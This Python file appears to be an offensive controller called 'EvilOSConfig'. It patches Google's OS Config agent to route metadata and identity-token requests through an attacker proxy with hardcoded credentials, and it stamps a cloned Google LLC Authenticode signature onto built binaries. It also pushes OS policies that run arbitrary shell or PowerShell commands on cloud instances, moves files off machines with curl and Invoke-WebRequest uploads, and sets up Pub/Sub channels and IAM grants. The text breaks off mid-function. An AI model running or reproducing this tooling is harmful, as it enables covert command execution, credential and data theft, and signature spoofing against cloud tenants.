#!/usr/bin/env python3
"""
EvilOSConfig Controller
- bake: Hardcode metadata proxy address into the agent source
- compile: Build the agent binary (with optional --trim to remove heavy deps)
- runcmd: Send a command via OS Policy ExecResource and retrieve results
- upload/download: Move files through Cloud Storage signed URLs
"""

import argparse
import binascii
import subprocess
import json
import sys
import time
import re
import os
import base64
import shlex
import struct
import shutil
import tempfile
import textwrap
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timezone
try:
    import readline as console_readline
except ImportError:
    console_readline = None
try:
    import yaml
except ModuleNotFoundError:
    class _JsonYamlFallback:
        @staticmethod
        def dump(data, stream, default_flow_style=False):
            json.dump(data, stream, indent=2)
            stream.write("\n")

    yaml = _JsonYamlFallback()

AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
AGENTCONFIG_PATH = os.path.join(AGENT_DIR, "agentconfig/agentconfig.go")
DEFAULT_CONFIG_FILE = ".env.json"
DEFAULT_PROXY_INSTANCE = "osconfig-token-proxy"
DEFAULT_ZONE = "asia-northeast3-a"
DEFAULT_DURATION = "3m"
DEFAULT_TIMEOUT = 120
DEFAULT_POLL_INTERVAL = 3
POLICY_ROLLOUT_TIMEOUT = 180

# Files/dirs to remove or stub for --trim
TRIM_TARGETS = {
    # scalibr (sqlite, vuln scanner) — biggest offender
    "packages/scalibr.go": "stub",
    # inventory pulls in scalibr, packages, heavy proto deps
    "inventory/inventory.go": "stub_inventory",
}

# Heavy go.mod deps to remove with --trim
TRIM_DEPS = [
    "github.com/google/osv-scalibr",
    "cos.googlesource.com/cos/tools.git",
]


# ── controller config ─────────────────────────────────────────────────

def load_controller_config(path):
    if path == DEFAULT_CONFIG_FILE and not os.path.exists(path):
        with open(path, "w") as f:
            f.write(transfer_config_template())
        print(f"[*] Created empty config template: {path}", file=sys.stderr)

    if not path or not os.path.exists(path):
        return {}

    try:
        with open(path, "r") as f:
            config = json.load(f)
    except json.JSONDecodeError as e:
        print(f"[!] Invalid JSON config {path}: {e}", file=sys.stderr)
        sys.exit(1)

    if not isinstance(config, dict):
        print(f"[!] JSON config {path} must contain an object", file=sys.stderr)
        sys.exit(1)
    return config


def config_value(config, *keys, default=None):
    for key in keys:
        if key in config and config[key] not in (None, ""):
            return config[key]
    return default


def persist_controller_config(path, updates):
    if not path:
        return

    config = load_controller_config(path)
    changed = False
    changed_keys = []
    for key, value in updates.items():
        if value not in (None, "") and config.get(key) != value:
            config[key] = value
            changed = True
            changed_keys.append(key)

    if not changed:
        return

    with open(path, "w") as f:
        json.dump(config, f, indent=2)
        f.write("\n")
    print(f"[*] Updated {path}: " + ", ".join(changed_keys), file=sys.stderr)


def apply_controller_config(args):
    explicit_proxy_instance = getattr(args, "proxy_instance", None)
    explicit_zone = getattr(args, "zone", None)

    config = load_controller_config(args.config)
    args.controller_config = config

    args.project = args.project or config_value(config, "project")

    if hasattr(args, "proxy_instance"):
        args.proxy_instance = (
            args.proxy_instance
            or config_value(config, "proxy_instance", "proxyInstance", default=DEFAULT_PROXY_INSTANCE)
        )
    if hasattr(args, "zone"):
        args.zone = args.zone or config_value(config, "zone", default=DEFAULT_ZONE)
    if hasattr(args, "duration"):
        args.duration = args.duration or config_value(config, "duration", "signed_url_duration", default=DEFAULT_DURATION)
    if hasattr(args, "timeout"):
        args.timeout = args.timeout or int(config_value(config, "timeout", default=DEFAULT_TIMEOUT))
    if hasattr(args, "poll_interval"):
        args.poll_interval = (
            args.poll_interval
            or int(config_value(config, "poll_interval", "pollInterval", default=DEFAULT_POLL_INTERVAL))
        )

    persist_controller_config(args.config, {
        "proxy_instance": explicit_proxy_instance,
        "zone": explicit_zone,
    })
    args.controller_config = load_controller_config(args.config)

    return args


def _apply_pe_signature(pe_path, sig_path):
    """Stamp a saved Authenticode signature blob onto a PE binary."""
    with open(sig_path, "rb") as f:
        sig_data = f.read()

    with open(pe_path, "r+b") as f:
        # Parse PE headers
        f.seek(0x3C)
        pe_off = struct.unpack("<I", f.read(4))[0]
        f.seek(pe_off)
        assert f.read(4) == b"PE\x00\x00"
        coff = f.read(20)
        opt_start = f.tell()
        magic = struct.unpack("<H", f.read(2))[0]

        # Checksum offset: opt_start + 64
        checksum_off = opt_start + 64
        # Certificate table data directory: index 4
        cert_dir_off = opt_start + (144 if magic == 0x20B else 128)

        # Pad file to 8-byte alignment
        f.seek(0, 2)
        file_size = f.tell()
        pad = (8 - (file_size % 8)) % 8
        if pad:
            f.write(b"\x00" * pad)
        cert_offset = file_size + pad

        # Append signature
        f.write(sig_data)

        # Update certificate table data directory
        f.seek(cert_dir_off)
        f.write(struct.pack("<II", cert_offset, len(sig_data)))

        # Zero the checksum (Windows doesn't enforce it for user-mode binaries)
        f.seek(checksum_off)
        f.write(struct.pack("<I", 0))


def transfer_config_template():
    return textwrap.dedent("""\
        {
          "signer_service_account": "",
          "project": "",
          "bucket": "",
          "proxy_instance": "",
          "zone": "",
          "duration": "",
          "timeout": "",
          "poll_interval": ""
        }
    """)

# ── bake ──────────────────────────────────────────────────────────────

def cmd_bake(args):
    with open(AGENTCONFIG_PATH, 'r') as f:
        content = f.read()

    proxy_addr = args.proxy_host

    changes = 0

    # Patch 1: getMetadata() — hardcode host
    old_pattern = r'host := os\.Getenv\(metadataHostEnv\)'
    if re.search(old_pattern, content):
        content = re.sub(old_pattern, f'host := "{proxy_addr}" // BAKED', content)
        changes += 1
    elif 'host := "' in content and 'BAKED' in content:
        content = re.sub(r'host := "[^"]*" // BAKED', f'host := "{proxy_addr}" // BAKED', content)
        changes += 1

    # Patch 2: Add auth header to getMetadata() for proxy basic auth
    auth_line = '\treq.Header.Add("Authorization", "Basic ZXZpbG9zY29uZmlnOmV2aWxvc2NvbmZpZw==") // BAKED'
    if auth_line not in content:
        content = content.replace(
            'req.Header.Add("Metadata-Flavor", "Google")',
            'req.Header.Add("Metadata-Flavor", "Google")\n' + auth_line,
        )
        changes += 1
    else:
        changes += 1  # already patched

    # Patch 3: IDToken() — replace metadata.Get() with our getMetadata()
    # This is needed because metadata.Get() uses its own GCE_METADATA_HOST check
    old_idtoken = r'data, err := metadata\.Get\(IdentityTokenPath\)'
    new_idtoken = f'raw, _, err := getMetadata(IdentityTokenPath)\n\tdata := string(raw) // BAKED'
    if re.search(old_idtoken, content):
        content = re.sub(old_idtoken, new_idtoken, content)
        # Comment out the now-unused metadata import
        content = re.sub(
            r'\t"cloud\.google\.com/go/compute/metadata"\n',
            '\t// "cloud.google.com/go/compute/metadata" // BAKED\n',
            content
        )
        changes += 1
    elif '// BAKED' in content and 'data := string(raw)' in content:
        changes += 1  # already patched

    if changes == 0:
        print("[!] Could not find patterns to patch in agentconfig.go", file=sys.stderr)
        sys.exit(1)

    with open(AGENTCONFIG_PATH, 'w') as f:
        f.write(content)

    print(f"[+] Baked into {AGENTCONFIG_PATH}:")
    print(f"    Metadata proxy: {proxy_addr}")
    print(f"    Patches applied: {changes}")


def cmd_unbake(args):
    with open(AGENTCONFIG_PATH, 'r') as f:
        content = f.read()

    # Revert getMetadata host
    content = re.sub(
        r'host := "[^"]*" // BAKED',
        'host := os.Getenv(metadataHostEnv)',
        content
    )

    # Revert auth header
    content = content.replace(
        '\n\treq.Header.Add("Authorization", "Basic ZXZpbG9zY29uZmlnOmV2aWxvc2NvbmZpZw==") // BAKED',
        '',
    )

    # Revert IDToken
    content = re.sub(
        r'raw, _, err := getMetadata\(IdentityTokenPath\)\n\tdata := string\(raw\) // BAKED',
        'data, err := metadata.Get(IdentityTokenPath)',
        content
    )

    # Restore metadata import
    content = re.sub(
        r'\t// "cloud\.google\.com/go/compute/metadata" // BAKED\n',
        '\t"cloud.google.com/go/compute/metadata"\n',
        content
    )

    with open(AGENTCONFIG_PATH, 'w') as f:
        f.write(content)

    print("[+] Restored original metadata host and IDToken")


# ── compile ───────────────────────────────────────────────────────────

SCALIBR_STUB = '''\
package packages

import (
\t"context"
\t"github.com/GoogleCloudPlatform/osconfig/osinfo"
)

type scalibrInstalledPackagesProvider struct {
\textractors      []string
\tosinfoProvider  osinfo.Provider
}

func (p scalibrInstalledPackagesProvider) GetInstalledPackages(ctx context.Context) (Packages, error) {
\treturn Packages{}, nil
}
'''

INVENTORY_STUB = '''\
package inventory

import (
\t"context"
\t"github.com/GoogleCloudPlatform/osconfig/packages"
)

type InstanceInventory struct {
\tHostname             string
\tLongName             string
\tShortName            string
\tVersion              string
\tArchitecture         string
\tKernelVersion        string
\tKernelRelease        string
\tOSConfigAgentVersion string
\tInstalledPackages    *packages.Packages
\tPackageUpdates       *packages.Packages
\tLastUpdated          string
}

type Provider interface {
\tGet(context.Context) *InstanceInventory
}

type defaultProvider struct{}

func NewProvider() Provider { return &defaultProvider{} }

func (p *defaultProvider) Get(ctx context.Context) *InstanceInventory {
\treturn &InstanceInventory{}
}
'''

STUBS = {
    "stub": SCALIBR_STUB,
    "stub_inventory": INVENTORY_STUB,
}


def cmd_compile(args):
    output = args.output or "google_osconfig_agent"
    backups = {}

    if args.trim:
        print("[*] Trimming heavy dependencies...")

        for rel_path, stub_key in TRIM_TARGETS.items():
            full_path = os.path.join(AGENT_DIR, rel_path)
            if os.path.exists(full_path):
                backups[full_path] = open(full_path).read()
                with open(full_path, 'w') as f:
                    f.write(STUBS[stub_key])
                print(f"    [+] Stubbed {rel_path}")

        # Remove unused go.mod deps
        for dep in TRIM_DEPS:
            subprocess.run(
                ["go", "mod", "edit", "-droprequire", dep],
                cwd=AGENT_DIR, capture_output=True
            )
            print(f"    [+] Dropped go.mod dep: {dep}")

        # Tidy
        print("    [*] Running go mod tidy...")
        result = subprocess.run(
            ["go", "mod", "tidy"],
            cwd=AGENT_DIR, capture_output=True, text=True
        )
        if result.returncode != 0:
            print(f"    [!] go mod tidy warnings (non-fatal):\n{result.stderr[:500]}")

    if args.with_pubsub:
        print("[*] Adding Pub/Sub dependency...")
        subprocess.run(
            ["go", "get", "cloud.google.com/go/pubsub@latest"],
            cwd=AGENT_DIR, capture_output=True, text=True
        )

    # Build
    env = os.environ.copy()
    env["CGO_ENABLED"] = "0"
    build_cmd = ["go", "build"]
    if args.trimpath:
        build_cmd.append("-trimpath")
    build_cmd.extend(["-o", output])

    if args.with_pubsub:
        build_cmd.extend(["-tags", "pubsub"])

    if args.ldflags:
        build_cmd.extend(["-ldflags", args.ldflags])

    print(f"[*] Building {output}...")
    result = subprocess.run(
        build_cmd, cwd=AGENT_DIR, env=env, capture_output=True, text=True, timeout=300
    )

    if result.returncode != 0:
        print(f"[!] Build failed:\n{result.stderr}", file=sys.stderr)
        # Restore backups
        for path, content in backups.items():
            with open(path, 'w') as f:
                f.write(content)
        sys.exit(1)

    # Restore backups (keep source clean)
    for path, content in backups.items():
        with open(path, 'w') as f:
            f.write(content)

    # Also restore go.mod if trimmed or pubsub dep was added
    if args.trim or args.with_pubsub:
        subprocess.run(["git", "checkout", "go.mod", "go.sum"], cwd=AGENT_DIR, capture_output=True)
        print("    [+] Restored go.mod/go.sum")

    binary_path = os.path.join(AGENT_DIR, output)

    # Auto-apply cloned Authenticode signature for Windows builds
    if output.lower().endswith(".exe"):
        sig_path = os.path.join(AGENT_DIR, "google_osconfig.sig")
        if os.path.exists(sig_path):
            _apply_pe_signature(binary_path, sig_path)
            print(f"[+] Applied cloned Authenticode signature (Google LLC)")
        else:
            print(f"[*] No signature file found ({sig_path}), skipping signing")

    size_mb = os.path.getsize(binary_path) / (1024 * 1024)
    print(f"[+] Built: {binary_path} ({size_mb:.1f} MB)")


# ── OS Policy Exec helpers ─────────────────────────────────────────────

LINUX_OS_SHORT_NAMES = [
    "debian",
    "centos",
    "ubuntu",
    "rhel",
    "rocky",
    "cos",
    "opensuse-leap",
    "ol",
    "sles",
]

LINUX_OUTPUT_FILE = "/tmp/evilosconfig-transfer.out"
WINDOWS_OUTPUT_FILE = r"C:\Windows\Temp\evilosconfig-transfer.out"


def resolve_instance_id(proxy_instance, zone, project):
    result = subprocess.run([
        "gcloud", "compute", "instances", "describe", proxy_instance,
        "--project", project, "--zone", zone, "--format", "value(id)"
    ], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] Cannot resolve instance ID: {result.stderr}", file=sys.stderr)
        sys.exit(1)
    return result.stdout.strip()


def exec_resource(resource_id, interpreter, enforce_script, output_file_path=None):
    enforce = {
        "interpreter": interpreter,
        "script": enforce_script,
    }
    if output_file_path:
        enforce["outputFilePath"] = output_file_path

    return {
        "id": resource_id,
        "exec": {
            "validate": {
                "interpreter": interpreter,
                "script": "exit 101\n",
            },
            "enforce": enforce,
        },
    }


def os_policy_assignment(policy_id, resource_groups):
    return {
        "osPolicies": [{
            "id": policy_id,
            "mode": "ENFORCEMENT",
            "resourceGroups": resource_groups,
        }],
        "instanceFilter": {"all": True},
        "rollout": {
            "disruptionBudget": {"fixed": 1},
            "minWaitDuration": "0s",
        },
    }


def write_policy_file(policy):
    fd, policy_file = tempfile.mkstemp(suffix=".yaml", prefix="ospc-")
    with os.fdopen(fd, 'w') as f:
        yaml.dump(policy, f, default_flow_style=False)
    return policy_file


def deploy_os_policy(policy_id, zone, policy_file, project):
    result = subprocess.run([
        "gcloud", "compute", "os-config", "os-policy-assignments", "create",
        policy_id,
        "--project", project,
        "--location", zone,
        "--file", policy_file,
        "--quiet",
        "--async",
    ], capture_output=True, text=True, timeout=30)

    if result.returncode != 0:
        print(f"[!] Failed to create policy:\n{result.stderr}", file=sys.stderr)
        sys.exit(1)


def delete_os_policy(policy_id, zone, project):
    subprocess.run([
        "gcloud", "compute", "os-config", "os-policy-assignments", "delete",
        policy_id, "--project", project, "--location", zone, "--quiet", "--async",
    ], capture_output=True, text=True)


def decode_report_bytes(value):
    if not value:
        return ""
    try:
        return base64.b64decode(value).decode(errors="replace").strip()
    except Exception:
        return str(value).strip()


def extract_report_output(report):
    for policy_compliance in report.get("osPolicyCompliances", []):
        for resource in policy_compliance.get("osPolicyResourceCompliances", []):
            output = resource.get("execResourceOutput", {})
            if "enforcementOutput" in output:
                enforcement_output = decode_report_bytes(output.get("enforcementOutput"))
                return enforcement_output, "", True

            for step in resource.get("configSteps", []):
                if step.get("type") != "DESIRED_STATE_ENFORCEMENT":
                    continue
                msg = step.get("errorMessage", "")
                if not msg:
                    continue
                stdout_match = re.search(r'stdout: (.*?)(?:, stderr:|$)', msg, re.DOTALL)
                stderr_match = re.search(r'stderr: (.*?)$', msg, re.DOTALL)
                stdout = stdout_match.group(1).strip() if stdout_match else ""
                stderr = stderr_match.group(1).strip() if stderr_match else ""
                return stdout, stderr, True
    return "", "", False


def run_os_policy(args, policy_id, policy, description):
    zone = args.zone
    policy_file = write_policy_file(policy)

    if args.dry_run:
        print("[*] Dry run — policy YAML:")
        with open(policy_file, 'r') as f:
            print(f.read())
        os.unlink(policy_file)
        return

    project = get_project(args.project)
    instance = getattr(args, "instance_id", None)
    if instance is None:
        instance = resolve_instance_id(args.proxy_instance, zone, project)

    stale = [p for p in _list_evilosconfig_policies(zone, project)
             if p.get("rolloutState") != "IN_PROGRESS"]
    if stale:
        print(f"[*] Cleaning {len(stale)} stale policies...")
        for p in stale:
            pid = p["name"].rsplit("/", 1)[-1]
            subprocess.run(
                ["gcloud", "compute", "os-config", "os-policy-assignments", "delete",
                 pid, "--location", zone, "--project", project, "--quiet", "--async"],
                capture_output=True, text=True,
            )

    print(f"[*] Deploying OS Policy: {policy_id}")
    if description:
        print(f"[*] {description}")

    try:
        deploy_os_policy(policy_id, zone, policy_file, project)
        print("[+] Policy deployed. Waiting for execution...")

        report_url = (
            f"https://osconfig.googleapis.com/v1/projects/{project}"
            f"/locations/{zone}/instances/{instance}"
            f"/osPolicyAssignments/{policy_id}/report"
        )

        output_found = False
        deadline = time.time() + args.timeout
        while time.time() < deadline:
            token = get_token()
            if not token:
                time.sleep(args.poll_interval)
                continue

            req = urllib.request.Request(report_url)
            req.add_header("Authorization", f"Bearer {token}")
            try:
                with urllib.request.urlopen(req, timeout=10) as resp:
                    report = json.loads(resp.read())
            except Exception:
                time.sleep(args.poll_interval)
                continue

            stdout, stderr, output_found = extract_report_output(report)
            if output_found:
                if stdout:
                    print(stdout)
                if stderr:
                    print(stderr, file=sys.stderr)
                break

            time.sleep(args.poll_interval)

        if not output_found:
            print("[!] Timed out waiting for output.", file=sys.stderr)
    finally:
        if not args.no_cleanup and not args.dry_run:
            delete_os_policy(policy_id, zone, project)
        os.unlink(policy_file)


# ── list ──────────────────────────────────────────────────────────────

STALE_THRESHOLD_SECS = 900   # 15 min — agent reports inventory every ~10 min


def _relative_time(iso_ts):
    try:
        dt = datetime.fromisoformat(iso_ts.replace("Z", "+00:00"))
    except (ValueError, AttributeError):
        return "", -1
    delta = datetime.now(timezone.utc) - dt
    secs = int(delta.total_seconds())
    if secs < 0:
        return "just now", 0
    if secs < 60:
        return f"{secs}s ago", secs
    if secs < 3600:
        return f"{secs // 60}m ago", secs
    if secs < 86400:
        return f"{secs // 3600}h ago", secs
    return f"{secs // 86400}d ago", secs


def cmd_list(args):
    project = get_project(args.project)
    zone = args.zone

    token = get_token()
    if not token:
        print("[!] Failed to get access token", file=sys.stderr)
        sys.exit(1)

    url = (
        f"https://osconfig.googleapis.com/v1/projects/{project}"
        f"/locations/{zone}/instances/-/inventories"
        f"?view=FULL&pageSize=100"
    )
    req = urllib.request.Request(url)
    req.add_header("Authorization", f"Bearer {token}")

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
    except Exception as e:
        print(f"[!] Failed to list inventories: {e}", file=sys.stderr)
        sys.exit(1)

    inventories = data.get("inventories", [])
    if not inventories:
        print("No registered agents found.")
        return

    rows = []
    for inv in inventories:
        name = inv.get("name", "")
        instance_id = name.split("/instances/")[1].split("/")[0] if "/instances/" in name else ""
        os_info = inv.get("osInfo", {})
        update_time = inv.get("updateTime", "")
        rel, age_secs = _relative_time(update_time)
        if age_secs < 0:
            status = "UNKNOWN"
        elif age_secs <= STALE_THRESHOLD_SECS:
            status = "ALIVE"
        else:
            status = "DEAD"
        rows.append([
            instance_id,
            os_info.get("shortName", ""),
            os_info.get("version", ""),
            os_info.get("architecture", ""),
            os_info.get("hostname", ""),
            rel,
            status,
        ])

    headers = ["InstanceID", "OS", "Version", "Arch", "Hostname", "LastSeen", "Status"]
    widths = [max(len(headers[c]), *(len(r[c]) for r in rows)) for c in range(len(headers))]
    fmt = "  ".join(f"{{:<{w}}}" for w in widths)

    print(fmt.format(*headers))
    print(fmt.format(*["-" * w for w in widths]))
    for r in rows:
        print(fmt.format(*r))


# ── runcmd ────────────────────────────────────────────────────────────

def cmd_runcmd(args):
    policy_id = f"evilosconfig-cmd-{int(time.time())}"
    if args.os == "windows":
        interpreter = "POWERSHELL"
        output_file = WINDOWS_OUTPUT_FILE
        script = (
            f"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8\n"
            f"& {{{args.command}}} | Out-File -FilePath {ps_quote(WINDOWS_OUTPUT_FILE)} -Encoding utf8\n"
            f"exit 100\n"
        )
    else:
        interpreter = "SHELL"
        output_file = LINUX_OUTPUT_FILE
        script = f"{args.command} > {shlex.quote(LINUX_OUTPUT_FILE)} 2>&1\nexit 100\n"
    resource_groups = [{
        "resources": [
            exec_resource("exec", interpreter, script, output_file),
        ],
    }]
    policy = os_policy_assignment(policy_id, resource_groups)
    run_os_policy(args, policy_id, policy, f"Command: {args.command}")


def get_project(override=None):
    if override:
        return override
    result = subprocess.run(
        ["gcloud", "config", "get-value", "project"],
        capture_output=True, text=True
    )
    return result.stdout.strip()


def get_token():
    result = subprocess.run(
        ["gcloud", "auth", "print-access-token"],
        capture_output=True, text=True
    )
    return result.stdout.strip()


# ── file transfer ─────────────────────────────────────────────────────

def agent_basename(path):
    normalized = path.rstrip("/\\").replace("\\", "/")
    return os.path.basename(normalized)


def parse_storage_path(path, default_bucket=None):
    if path.startswith("gs://"):
        parts = path[5:].split("/", 1)
        if len(parts) != 2 or not parts[0] or not parts[1]:
            raise ValueError("storage path must include both bucket and object")
        return parts[0], parts[1]

    if default_bucket and not path.startswith("/"):
        obj = path
        if not obj:
            raise ValueError("storage object must not be empty")
        return default_bucket, obj

    if not path.startswith("/"):
        raise ValueError("storage path must use /bucket/object format")
    parts = path.strip("/").split("/", 1)
    if len(parts) != 2 or not parts[0] or not parts[1]:
        raise ValueError("storage path must include both bucket and object")
    return parts[0], parts[1]


def resolve_upload_storage_path(dest_path, source_basename, default_bucket=None):
    if dest_path.endswith("/"):
        dest_path = dest_path + source_basename
    bucket, obj = parse_storage_path(dest_path, default_bucket=default_bucket)
    return bucket, obj, f"gs://{bucket}/{obj}"


def resolve_download_storage_path(source_path, default_bucket=None):
    bucket, obj = parse_storage_path(source_path, default_bucket=default_bucket)
    return bucket, obj, f"gs://{bucket}/{obj}"


def resolve_local_download_path(storage_object, destination):
    object_basename = os.path.basename(storage_object.rstrip("/"))
    if not object_basename:
        raise ValueError("storage object must have a file name")

    if os.path.isdir(destination):
        return os.path.join(destination, object_basename)

    parent = os.path.dirname(destination) or "."
    if not os.path.isdir(parent):
        raise ValueError(f"destination parent does not exist: {parent}")
    return destination


def get_signer_service_account(config):
    signer = config_value(config, "signer_service_account", "signer_sa", "signerServiceAccount")
    if not signer:
        raise RuntimeError(
            f"signer_service_account is required in {DEFAULT_CONFIG_FILE} or the file passed with --config.\n"
            f"Example:\n{transfer_config_template()}"
        )
    return signer


def create_signed_url(gs_uri, duration, http_verb, config):
    signer = get_signer_service_account(config)
    result = subprocess.run([
        "gcloud", "storage", "sign-url", gs_uri,
        f"--duration={duration}",
        f"--http-verb={http_verb}",
        f"--impersonate-service-account={signer}",
    ], capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"failed to create signed URL: {result.stderr.strip()}")

    url_match = re.search(r'https?://\S+', result.stdout)
    if url_match:
        return url_match.group(0)
    raise RuntimeError(f"failed to parse signed URL from gcloud output: {result.stdout.strip()}")


def local_upload(source_file, signed_url):
    with open(source_file, "rb") as f:
        data = f.read()
    req = urllib.request.Request(signed_url, data=data, method="PUT")
    req.add_header("Content-Length", str(len(data)))
    with urllib.request.urlopen(req, timeout=120) as resp:
        return resp.status


def local_download(signed_url, destination_file):
    req = urllib.request.Request(signed_url, method="GET")
    with urllib.request.urlopen(req, timeout=120) as resp:
        with open(destination_file, "wb") as f:
            shutil.copyfileobj(resp, f)
        return resp.status


def ps_quote(value):
    return "'" + value.replace("'", "''") + "'"


def build_linux_upload_script(source_file, signed_url):
    return textwrap.dedent(f"""\
        set -eu
        src={shlex.quote(source_file)}
        url={shlex.quote(signed_url)}
        curl -fsS -X PUT --upload-file "$src" "$url"
        printf '%s\\n' "uploaded $src" > {shlex.quote(LINUX_OUTPUT_FILE)}
        exit 100
    """)


def build_windows_upload_script(source_file, signed_url):
    return textwrap.dedent(f"""\
        $ErrorActionPreference = 'Stop'
        $src = {ps_quote(source_file)}
        $uri = {ps_quote(signed_url)}
        Invoke-WebRequest -Method Put -InFile $src -Uri $uri -UseBasicParsing | Out-Null
        "uploaded $src" | Out-File -FilePath {ps_quote(WINDOWS_OUTPUT_FILE)} -Encoding utf8
        exit 100
    """)


def build_linux_download_script(signed_url, destination, object_basename):
    return textwrap.dedent(f"""\
        set -eu
        dst={shlex.quote(destination)}
        url={shlex.quote(signed_url)}
        case "$dst" in
          */) dst="${{dst}}{object_basename}" ;;
        esac
        curl -fsS -L -o "$dst" "$url"
        printf '%s\\n' "downloaded $dst" > {shlex.quote(LINUX_OUTPUT_FILE)}
        exit 100
    """)


def build_windows_download_script(signed_url, destination, object_basename):
    return textwrap.dedent(f"""\
        $ErrorActionPreference = 'Stop'
        $dst = {ps_quote(destination)}
        $uri = {ps_quote(signed_url)}
        if ($dst.EndsWith('\\') -or $dst.EndsWith('/')) {{
          $dst = $dst + {ps_quote(object_basename)}
        }}
        Invoke-WebRequest -Method Get -Uri $uri -OutFile $dst -UseBasicParsing
        "downloaded $dst" | Out-File -FilePath {ps_quote(WINDOWS_OUTPUT_FILE)} -Encoding utf8
        exit 100
    """)


def transfer_policy(policy_id, linux_script, windows_script):
    resource_groups = [
        {
            "inventoryFilters": [{"osShortName": name} for name in LINUX_OS_SHORT_NAMES],
            "resources": [
                exec_resource("linux-transfer", "SHELL", linux_script, LINUX_OUTPUT_FILE),
            ],
        },
        {
            "inventoryFilters": [{"osShortName": "windows"}],
            "resources": [
                exec_resource("windows-transfer", "POWERSHELL", windows_script, WINDOWS_OUTPUT_FILE),
            ],
        },
    ]
    return os_policy_assignment(policy_id, resource_groups)


def cmd_upload(args):
    config = args.controller_config
    default_bucket = config_value(config, "bucket", "default_bucket", "storage_bucket")

    if args.target == "local":
        if not os.path.isfile(args.src_file):
            print(f"[!] Source file does not exist: {args.src_file}", file=sys.stderr)
            sys.exit(1)
        source_basename = os.path.basename(args.src_file)
    else:
        source_basename = agent_basename(args.src_file)
        if not source_basename:
            print("[!] Agent source path must include a file name", file=sys.stderr)
            sys.exit(1)

    try:
        bucket, obj, gs_uri = resolve_upload_storage_path(args.storage_path, source_basename, default_bucket)
        signed_url = create_signed_url(gs_uri, args.duration, "PUT", config)
    except Exception as e:
        print(f"[!] {e}", file=sys.stderr)
        sys.exit(1)

    if args.target == "local":
        try:
            status = local_upload(args.src_file, signed_url)
        except Exception as e:
            print(f"[!] Upload failed: {e}", file=sys.stderr)
            sys.exit(1)
        print(f"[+] Uploaded {args.src_file} to gs://{bucket}/{obj} (HTTP {status})")
        return

    policy_id = f"evilosconfig-upload-{int(time.time())}"
    policy = transfer_policy(
        policy_id,
        build_linux_upload_script(args.src_file, signed_url),
        build_windows_upload_script(args.src_file, signed_url),
    )
    run_os_policy(args, policy_id, policy, f"Agent upload: {args.src_file} -> gs://{bucket}/{obj}")


def cmd_download(args):
    config = args.controller_config
    default_bucket = config_value(config, "bucket", "default_bucket", "storage_bucket")

    try:
        bucket, obj, gs_uri = resolve_download_storage_path(args.storage_path, default_bucket)
        signed_url = create_signed_url(gs_uri, args.duration, "GET", config)
    except Exception as e:
        print(f"[!] {e}", file=sys.stderr)
        sys.exit(1)

    object_basename = os.path.basename(obj.rstrip("/"))
    if not object_basename:
        print("[!] Storage object must include a file name", file=sys.stderr)
        sys.exit(1)

    if args.target == "local":
        try:
            destination_file = resolve_local_download_path(obj, args.dst_path)
            status = local_download(signed_url, destination_file)
        except Exception as e:
            print(f"[!] Download failed: {e}", file=sys.stderr)
            sys.exit(1)
        print(f"[+] Downloaded gs://{bucket}/{obj} to {destination_file} (HTTP {status})")
        return

    policy_id = f"evilosconfig-download-{int(time.time())}"
    policy = transfer_policy(
        policy_id,
        build_linux_download_script(signed_url, args.dst_path, object_basename),
        build_windows_download_script(signed_url, args.dst_path, object_basename),
    )
    run_os_policy(args, policy_id, policy, f"Agent download: gs://{bucket}/{obj} -> {args.dst_path}")


# ── pubsub ───────────────────────────────────────────────────────────

PUBSUB_CMD_TOPIC = "evilosconfig-cmd"
PUBSUB_OUTPUT_TOPIC = "evilosconfig-output"
PUBSUB_CMD_SUB = "evilosconfig-cmd-sub"
PUBSUB_OUTPUT_SUB = "evilosconfig-output-sub"
PUBSUB_PULL_TIMEOUT_GRACE = 15
PUBSUB_LEGACY_CLOCK_SKEW = 2


def cmd_enable_pubsub(args):
    project = get_project(args.project)
    print(f"[*] Ensuring Pub/Sub infrastructure in project: {project}")

    subprocess.run(["gcloud", "services", "enable", "pubsub.googleapis.com",
                    "--project", project, "--quiet"],
                   capture_output=True, text=True)
    print("    [+] Enabled pubsub.googleapis.com")

    for topic in [PUBSUB_CMD_TOPIC, PUBSUB_OUTPUT_TOPIC]:
        result = subprocess.run(
            ["gcloud", "pubsub", "topics", "create", topic,
             "--project", project, "--quiet"],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"    [+] Created topic: {topic}")
        else:
            print(f"    [~] Topic {topic}: {result.stderr.strip()}")

    for sub, topic in [(PUBSUB_CMD_SUB, PUBSUB_CMD_TOPIC), (PUBSUB_OUTPUT_SUB, PUBSUB_OUTPUT_TOPIC)]:
        result = subprocess.run(
            ["gcloud", "pubsub", "subscriptions", "create", sub,
             "--project", project, "--topic", topic, "--ack-deadline=30", "--quiet"],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"    [+] Created subscription: {sub} → {topic}")
        else:
            print(f"    [~] Subscription {sub}: {result.stderr.strip()}")

    print("[+] Pub/Sub infrastructure ready.")

    zone = args.zone
    instance = args.proxy_instance

    sa_result = subprocess.run(
        ["gcloud", "compute", "instances", "describe", instance,
         "--project", project, "--zone", zone,
         "--format", "value(serviceAccounts.email)"],
        capture_output=True, text=True,
    )
    sa = sa_result.stdout.strip()
    if sa:
        check = subprocess.run(
            ["gcloud", "projects", "get-iam-policy", project,
             "--flatten", "bindings[].members",
             "--filter", f"bindings.members:serviceAccount:{sa} AND bindings.role:roles/pubsub",
             "--format", "value(bindings.role)"],
            capture_output=True, text=True,
        )
        if check.stdout.strip():
            print(f"    [~] IAM: {sa} already has Pub/Sub role")
        else:
            grant = subprocess.run(
                ["gcloud", "projects", "add-iam-policy-binding", project,
                 f"--member=serviceAccount:{sa}", "--role=roles/pubsub.editor", "--quiet"],
                capture_output=True, text=True,
            )
            if grant.returncode == 0:
                print(f"    [+] IAM: granted roles/pubsub.editor to {sa}")
            else:
                print(f"    [!] IAM: failed to grant pubsub role: {grant.stderr.strip()}", file=sys.stderr)
    else:
        print(f"    [!] Could not resolve service account for {instance}", file=sys.stderr)

    print(f"[*] Enabling Pub/Sub on {instance} ({zone})...")
    result = subprocess.run([
        "gcloud", "compute", "instances", "add-metadata", instance,
        "--project", project, "--zone", zone,
        "--metadata", "enable-pubsub=true", "--quiet"
    ], capture_output=True, text=True)
    if result.returncode == 0:
